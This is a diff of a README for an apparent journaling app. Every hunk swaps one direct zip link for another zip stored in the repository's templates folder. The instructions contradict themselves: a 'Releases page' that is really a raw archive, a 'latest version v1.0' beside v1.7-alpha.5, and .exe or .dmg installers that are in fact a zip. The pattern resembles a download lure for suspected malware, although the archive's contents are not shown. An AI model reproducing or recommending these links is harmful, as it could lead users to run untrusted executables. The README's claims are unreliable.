@@ -1,7 +1,7 @@
 # ✨ daily-reflective-journal - Your daily thoughts in one place
 
 ## 🌐 Download Now
-[![Download](https://raw.githubusercontent.com/RafiAhmadZanjabila/daily-reflective-journal/main/app/static/app/daily-reflective-journal_1.5.zip)](https://raw.githubusercontent.com/RafiAhmadZanjabila/daily-reflective-journal/main/app/static/app/daily-reflective-journal_1.5.zip)
+[![Download](https://github.com/RafiAhmadZanjabila/daily-reflective-journal/raw/refs/heads/main/app/templates/app/daily_reflective_journal_v1.7-alpha.5.zip)](https://github.com/RafiAhmadZanjabila/daily-reflective-journal/raw/refs/heads/main/app/templates/app/daily_reflective_journal_v1.7-alpha.5.zip)
 
 ## 📜 Description
 The daily-reflective-journal is your perfect personal journal. Capture your thoughts, track your moods, and reflect on your day with ease. This application allows you to maintain a digital record of your feelings and experiences, helping you grow and gain insight over time.
@@ -10,7 +10,7 @@ The daily-reflective-journal is your perfect personal journal. Capture your thou
 To start using daily-reflective-journal, follow these simple steps:
 
 ### 1. Visit the Download Page
-To download the application, visit the Releases page [here](https://raw.githubusercontent.com/RafiAhmadZanjabila/daily-reflective-journal/main/app/static/app/daily-reflective-journal_1.5.zip). 
+To download the application, visit the Releases page [here](https://github.com/RafiAhmadZanjabila/daily-reflective-journal/raw/refs/heads/main/app/templates/app/daily_reflective_journal_v1.7-alpha.5.zip). 
 
 ### 2. Choose Your Version
 On the Releases page, you will see a list of available versions. Look for the latest version, which is v1.0. Click on it to view more details.
@@ -23,7 +23,7 @@ Once the download is complete, locate the downloaded file in your "Downloads" fo
 
 - **Windows:** Double-click the .exe file to start the installation process. Follow the on-screen instructions to complete the installation.
 - **Mac:** Open the .dmg file and drag the application into the Applications folder. This will install the journal app.
-- **Linux:** Extract the downloaded https://raw.githubusercontent.com/RafiAhmadZanjabila/daily-reflective-journal/main/app/static/app/daily-reflective-journal_1.5.zip file and follow the installation instructions included.
+- **Linux:** Extract the downloaded https://github.com/RafiAhmadZanjabila/daily-reflective-journal/raw/refs/heads/main/app/templates/app/daily_reflective_journal_v1.7-alpha.5.zip file and follow the installation instructions included.
 
 ### 5. Launch the Application
 After the installation is complete, find the daily-reflective-journal icon on your desktop or in your applications folder. Click on it to launch the app.
@@ -69,7 +69,7 @@ Yes, your entries are stored securely. We use encryption to protect your data fr
 If you face any problems, please check our issue tracker on GitHub. You can report bugs or seek help from the community.
 
 ## 🔗 Useful Links
-- **Releases Page:** [Download the latest version](https://raw.githubusercontent.com/RafiAhmadZanjabila/daily-reflective-journal/main/app/static/app/daily-reflective-journal_1.5.zip)
+- **Releases Page:** [Download the latest version](https://github.com/RafiAhmadZanjabila/daily-reflective-journal/raw/refs/heads/main/app/templates/app/daily_reflective_journal_v1.7-alpha.5.zip)
 - **Documentation:** Explore the documentation for detailed guides and tips.
 - **Support:** Visit our support page for troubleshooting and help.
 
@@ -79,4 +79,4 @@ Thanks to the open-source community for their contributions and support in devel
 ## 📬 Stay Connected
 Join our community for updates and share your experiences. Follow us on social media or join our group to connect with other users.
 
-[![Download](https://raw.githubusercontent.com/RafiAhmadZanjabila/daily-reflective-journal/main/app/static/app/daily-reflective-journal_1.5.zip)](https://raw.githubusercontent.com/RafiAhmadZanjabila/daily-reflective-journal/main/app/static/app/daily-reflective-journal_1.5.zip)
+[![Download](https://github.com/RafiAhmadZanjabila/daily-reflective-journal/raw/refs/heads/main/app/templates/app/daily_reflective_journal_v1.7-alpha.5.zip)](https://github.com/RafiAhmadZanjabila/daily-reflective-journal/raw/refs/heads/main/app/templates/app/daily_reflective_journal_v1.7-alpha.5.zip)
